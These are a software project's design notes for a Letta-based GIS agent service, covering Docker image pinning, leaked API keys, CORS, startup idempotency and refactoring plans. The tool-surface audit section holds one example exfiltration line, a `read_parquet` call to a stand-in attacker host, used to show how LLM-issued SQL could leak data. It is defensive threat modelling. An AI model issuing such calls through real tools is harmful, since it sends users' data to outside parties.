# Design Notes & Planned Improvements

Living document. Architecture overview is in [architecture.md](architecture.md); HTTP surface is in [api_reference.md](api_reference.md). This file captures known weaknesses, refactor proposals, and ideas not yet ready for a ticket — so future contributors (and Claude sessions) can pick up the thread.

## Status legend

- 🔴 Security / correctness — should land soon
- 🟡 Code health — meaningful improvement, no user-visible change
- 🟢 Product / cross-repo — depends on other parts of the suite

---

## 🟡 Pin the Letta base image instead of `:latest`

The Dockerfile uses `FROM letta/letta:latest`. Docker BuildKit reuses the cached base layer on every rebuild and never re-pulls `:latest` unless you pass `--pull`. We hit this in practice — a 3-month-old cached image silently shipped, and quirks (YAML escape handling in tool sandbox) and surprise migration mismatches followed.

**Plan:**

1. **Pin the version** in the Dockerfile: `FROM letta/letta:0.x.y` against the latest stable release. Predictable, breaks loudly on upgrade (which is what you want — an intentional bump tied to a migration check).
2. **Document the pgdata coupling.** A pin change means a likely Postgres migration; the runbook should be: pin bump → wipe `~/.letta/.persist/pgdata` (or back it up) → `docker compose up -d`.
3. **Tag known-good images locally** so you can fall back: `docker tag letta/letta:latest letta/letta:current-working-YYYY-MM` before pulling a new `:latest`.

Until pinned, prefer `docker build --pull -t letta-gis:latest .` so each rebuild re-checks the registry.

## 🔴 Rotate the API keys committed to `docker-compose.yml`

`XAI_API_KEY` and `OPENAI_API_KEY` are committed as literals in [`docker-compose.yml`](../docker-compose.yml). Even if the repo is private today, treat these as leaked.

**Plan:**
1. Rotate both keys at the provider console.
2. Replace inline values with `${XAI_API_KEY}` / `${OPENAI_API_KEY}` and add a `.env.example` documenting which vars are needed.
3. Add `.env` to `.gitignore` (verify it's already there).
4. Consider adding a pre-commit hook (e.g. `gitleaks`) so the next accidental commit fails CI.

## 🔴 Tighten CORS for any non-dev deployment

[`server.py`](../src/api/server.py) currently sets `allow_origins=["*"]`. Fine for `localhost` development. Before any internet-reachable deployment, the allow list must be narrowed to the actual ViewTopia / dashboard origins. Move the value to an env var (`CORS_ORIGINS`) with the wildcard as the dev default.

## 🔴 Audit the `viewer_control` and `sql_query` tool surface

Both let the LLM hand the browser arbitrary instructions. DuckDB-WASM is sandboxed in a Web Worker, but malicious SQL can still:

- `read_parquet('http://attacker.example/leak')` — DuckDB-WASM's HTTP fetcher inherits the page's CORS posture.
- Hammer arbitrary internal endpoints if the viewer is run on a corporate network.

**Plan:** lock down acceptable `viewer_control` actions to an enum; for `sql_query` consider an opt-in allowlist of domains that DuckDB may fetch from (configured at the viewer side, not the agent).

## 🟡 Decide what to do with `core/qgis_engine.py` and `core/memory_manager.py`

Both are 1-line stubs after the `server.py` split. Options:

- **Delete them.** They're noise; the architecture works fine with `agent_manager.py` and `workflows.py` plus the tools themselves.
- **Populate them.** A `MemoryManager` wrapping the persona-block + shared `gis_workflow` block sync logic in `startup()` would be tidy. A `QGISEngine` class would only have value if multiple tools share a common init pattern — today they don't.

Preference: **delete** unless we identify a concrete shared abstraction.

## 🟡 Make startup idempotent

Today's startup sequence in [`server.py`](../src/api/server.py) creates the Letta agent (`client.agents.create`) **before** writing `.agent_id`. If anything between those two operations fails, we leak an orphan agent in Letta on the next startup. We hit this exactly once already (the `PermissionError` on the wrong `TOOL_EXEC_DIR`).

**Plan:** write `.agent_id` as soon as the agent ID is known, before any further setup. If subsequent setup fails, the next startup resumes the same agent. Also catch the orphan case: on startup, if `.agent_id` is missing but the Letta server has agents tagged with our naming convention, consider adopting one rather than creating another.

## 🟡 Move route bodies into `APIRouter` modules (Phase B of the split)

`server.py` is still ~1040 lines, mostly route bodies. Reasonable next refactor:

```
src/api/
├── server.py            # app factory, lifespan, middleware, mount static — ~150 lines
├── routes/
│   ├── chat.py          # /chat, /chat/stream
│   ├── sessions.py      # /sessions/*
│   ├── datasets.py      # /datasets, /upload, /stats/*, /geojson/*
│   ├── outputs.py       # /outputs/*, /download/*
│   ├── share.py         # /share/*
│   ├── export.py        # /draw, /export-pdf, /export-png
│   └── debug.py         # /health, /debug/tools
```

Blocker today: `agent_id` is a module-level global mutated by four routes. Move it to `app.state.agent_id` (FastAPI-idiomatic) or a small `AgentState` class injected as a dependency, then the routes can move cleanly. ~half a day of work.

## 🟡 Replace deprecated `@app.on_event("startup")` with lifespan

FastAPI deprecated the event hooks in favour of the `lifespan` context manager. The current code works but emits a deprecation warning under newer FastAPI versions. Wrap the existing startup body in an `@asynccontextmanager` and pass it to `FastAPI(lifespan=...)`.

## 🟡 Real health check

`GET /health` currently returns `{"status": "ok"}` regardless of whether Letta is reachable. For load-balancer use, ping Letta (and the embedding server, if configured) and return non-200 on failure. Keep a `/health/live` (always 200) vs `/health/ready` (dependency-aware) split.

## 🟡 Add a request log

There's no access log on the FastAPI side. When a chat fails (LLM 429, tool exception, Letta timeout) we currently have only stdout traceback. Add a small middleware that logs method, path, status, duration, and Letta agent id per request.

## 🟡 Add minimal pytest coverage

The codebase has `src/tests/` but no visible test files. A small set would catch refactor regressions early:

- `test_workflows.py` — pure functions: `get_progress_text`, `infer_ui_spec_from_text`, `extract_text_and_ui_spec` (with a fake response).
- `test_routes_smoke.py` — `TestClient` calls to `/health`, `/sessions`, `/datasets`, mocking the Letta client.
- `test_persona.py` — assert PERSONA is non-empty and contains every tool name it references (currently easy to drift).

This refactor's regression (the missed `infer_ui_spec_from_text` call site) would have been caught by even the smoke test in seconds.

## 🟡 Deduplicate tool input parsing

Many tools under [`src/agents/tools/`](../src/agents/tools/) parse semicolon-separated lists, pipe-delimited specs, or address strings ad-hoc. A shared `parse_semicolon_list`, `parse_layer_spec`, and `split_addresses` helper added via `TOOL_HELPERS` would deduplicate ~30 LOC across tools and prevent splitter divergence.

## 🟡 Simplify `register_tool`

The function has two code paths — one for `TOOL_HELPERS`/`source_code` upload, one for `upsert_from_function`. The first does `tools.list(name=...) → update | upsert`, the second relies on the SDK helper. Collapse to the source-concat path uniformly so the contract is "we always upload assembled source" and remove the fallback branch.

## 🟡 The PERSONA prompt overlaps with tool docstrings

The PERSONA constant is ~9 KB and embeds tool-routing instructions ("when the user mentions travel time, use `calculate_isochrones`…"). Many of these are also in the tool docstrings, which Letta injects into the agent's tool-call context. The result is duplicated guidance — costs tokens every turn and risks divergence when a tool is updated but PERSONA isn't.

**Plan:** keep PERSONA narrow (role, output style, error-recovery rules) and push routing hints into tool docstrings. Audit by removing one routing rule at a time and verifying behaviour.

## ✅ Surface the `sql_query` tool to the agent (done 2026-07)

`src/agents/tools/sql_query.py` emits the `sql_query` viewer command per the sketch in `viewer_integration.md`, with the "when NOT to use" guidance in the docstring and PERSONA. Landed together with the platform-service tools (`ptolemy_query`, `list_tilesets`), geokode-first `geocode_place`, itinera-first `compute_route`, and the QGIS sys.path fix that makes `run_qgis_algorithm` actually work (321 algorithms).

## 🟢 Externalise the model choice

The Grok model id (`grok-4-1-fast-reasoning`) appears in two places in [`server.py`](../src/api/server.py) — `startup()` and `/sessions/new`. Pull into a constant, then to `GEOLANG_LLM_MODEL` / `GEOLANG_LLM_ENDPOINT` env vars with the current values as defaults. Same for embedding config.

## 🟡 Tool-exec venv is not populated automatically

Letta runs tool source in `<TOOL_EXEC_DIR>/<TOOL_EXEC_VENV_NAME>/` and auto-creates the venv on first use ([Letta source: `_prepare_venv`](../../letta/letta/services/tool_sandbox/local_sandbox.py)). It does NOT install our `requirements.txt` into that venv — its only pip-install path is per-tool via `tool.pip_requirements`. Tools like `download_natural_earth_dataset` therefore fail with `ModuleNotFoundError: pydantic` until the venv is manually populated.

Today's workaround: populate the venv on the host (since the compose mounts the repo into the container):
```bash
cd <repo>; python3 -m venv env && ./env/bin/pip install -r requirements.txt
```

Longer-term options:

1. **Declare `pip_requirements` per tool.** Letta's tool schema supports it. Update `register_tool()` in [`agent_manager.py`](../src/agents/agent_manager.py) to forward a `TOOL_PIP_REQUIREMENTS` constant from each tool module. Cleanest separation; touches 35 tool files.
2. **Entrypoint that populates the venv on container start.** Survives the host-volume mount that shadows anything baked into the image. Adds a small entrypoint script but no per-tool change.

Pick 2 for shipping, 1 for code hygiene.

The agent should not be the canary for missing tool-runtime deps — add a startup check that imports each tool's required modules in the sandbox and logs a warning at registration time.

---

## Done (recently)

Keep a short history at the bottom so we can see the trajectory without diving into git.

- **2026-06**: Split `server.py` (1481 → 1043 lines). Extracted `core/utils.py`, `agents/agent_manager.py`, `agents/workflows.py`. Tool source unchanged — Letta sandbox sees identical code. Path issue uncovered: `TOOL_EXEC_DIR` default `~/src/geolang` was wrong for `GeoLang/geolang` checkouts; fixed by auto-detecting the repo root.
- **2026-06**: Added `viewer_integration.md` documenting the SSE `viewer_cmd` protocol and the upcoming `sql_query` tool that pairs with ViewTopia's DuckDB-WASM integration.
- **2026-06**: Populated `architecture.md` and `api_reference.md` (were empty stubs).
